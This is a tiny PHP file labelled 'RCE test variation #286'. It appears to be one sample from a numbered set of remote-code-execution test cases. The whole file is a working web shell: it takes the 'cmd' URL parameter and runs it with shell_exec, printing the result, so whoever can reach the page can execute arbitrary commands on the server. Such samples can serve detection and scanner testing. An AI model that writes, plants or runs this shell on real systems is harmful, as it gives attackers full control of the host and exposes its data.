<?php
// RCE test variation #286
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>